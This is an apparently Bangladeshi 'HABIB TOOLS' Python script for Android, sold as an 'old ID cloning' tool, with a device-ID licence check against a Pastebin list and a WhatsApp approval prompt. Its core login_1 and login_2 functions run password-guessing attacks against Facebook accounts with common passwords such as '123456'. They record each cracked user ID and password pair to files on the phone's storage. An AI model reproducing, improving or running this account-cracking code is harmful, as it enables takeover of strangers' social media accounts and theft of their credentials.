...
# --- HABIB TOOLS LICENSING SYSTEM ---
import os, sys, uuid, requests, webbrowser, urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as tred
import random

# --- ১. ডিভাইসের স্থায়ী আইডি ---
def get_device_id():
    try:
        serial = os.popen("getprop ro.serialno").read().strip()
        if not serial:
            serial = os.popen("getprop ro.product.model").read().strip()
        return serial if serial else "UNKNOWN_ID"
    except:
        return "UNKNOWN_ID"
...
# --- ২. হোয়াটসঅ্যাপ রিডাইরেক্ট ---
def send_key_to_whatsapp(device_id):
    phone_number = "8801775745013"
    text = f"আমার ডিভাইস আইডি: {device_id}। আমি টুলটি এপ্রুভ করাতে চাই।"
    
    # হোয়াটসঅ্যাপ লিঙ্ক তৈরি
    url = f"https://wa.me/{phone_number}?text={urllib.parse.quote(text)}"
    
    print("\n\033[1;36m[!] Send a message on WhatsApp to run the tools.\033[0m")
    input("\033[1;33m[>] Press (Enter) I am opening your WhatsApp....\033[0m")
    
    # সবচেয়ে কার্যকর পদ্ধতি:
    os.system(f"am start -a android.intent.action.VIEW -d '{url}'")
    sys.exit()


# --- ৩. লাইসেন্স ভ্যালিডেশন ---
def check_approval():
    clear()
    print("""\033[1;31m
██╗░░██╗░█████╗░██████╗░██╗██████╗░
...
\033[1;32m╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝╚═════╝░ HRK V0.2
\033[1;34m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═
\033[1;35m[\033[1;31m✔\033[1;35m]DEVELOPER      \033[1;31m: \033[1;35mHRK HABIB KAZI
\033[1;35m[\033[1;31m✔\033[1;35m]FACEBOOK       \033[1;31m: \033[1;32mMD HABIBUR RAHMAN KAZI
\033[1;35m[\033[1;31m✔\033[1;35m]TOOL           \033[1;31m: \033[1;34mOLD ID CLONING
\033[1;35m[\033[1;31m✔\033[1;35m]STATUS         \033[1;31m: \033[1;32mPAID
\033[1;35m[\033[1;31m✔\033[1;35m]VERSION        \033[1;31m: \033[1;32m[𝚅0.2]
\033[1;34m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═""")
    
    device_id = get_device_id()
    raw_url = "https://pastebin.com/raw/L5WrucLV"
    
    try:
        response = requests.get(raw_url, timeout=10).text
            ...
            for line in response.splitlines():
                if device_id in line and '|' in line:
                    ...
                    if datetime.now() < datetime.strptime(expiry_date, '%Y-%m-%d'):
                        return True
            print("\n\033[1;31m[×] মেয়াদ শেষ বা ফরম্যাট ভুল!\033[0m")
            return False
        else:
            print(f"\n\033[1;33m[!] YOUR KEY COPY THIS OR SNED ME WHATSAPP : {device_id}\033[0m")
            send_key_to_whatsapp(device_id)
            return False
...
# --- মেইন প্রোগ্রাম রান ---
# খেয়াল করুন এই লাইনগুলোর শুরুতে কোনো স্পেস নেই
if __name__ == '__main__':
    # নিচের লাইনটি একটি Tab বা ৪টি Space ভেতরে থাকবে
    if check_approval():
        print("\n\033[1;32m[✓] লাইসেন্স এপ্রুভড! টুলটি চালু হচ্ছে... 🐒🐈\033[0m")
        # BNG_71_()
    else:
        # নিচের লাইনটিও ৪টি Space ভেতরে থাকবে
        sys.exit()
...
approved_keys = ["HABIB-ADRIAN hfjgbvcdhbvvd@@-2025"]
...
os.system('clear')
print(' \x1b[38;5;46mHABIB SERVER LOADING....')
...
# Set window title
sys.stdout.write('\x1b]2;𓆩【HABIB】𓆪 \x07')


    # HABIB Clover Logo - Green - Version 2.5
def ____banner____():
...
\033[1;35m[\033[1;31m✔\033[1;35m]FACEBOOK       \033[1;31m: \033[1;32mMD HABIBUR RAHMAN KAZI
\033[1;35m[\033[1;31m✔\033[1;35m]TOOL           \033[1;31m: \033[1;34mOLD ID CLONING
\033[1;35m[\033[1;31m✔\033[1;35m]STATUS         \033[1;31m: \033[1;32mFREE
\033[1;35m[\033[1;31m✔\033[1;35m]VERSION        \033[1;31m: \033[1;32m[𝚅8]
\033[1;34m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═""")
...
def login_1(uid):
    ...
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mHABIB-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            ...
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mHABIB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/HABIB-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mHABIB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/HABIB-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
...
def login_2(uid):
    ...
    """
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mHABIB-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        ...
        try:
            with requests.Session() as session:
                ...
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mHABIB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/HABIB-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
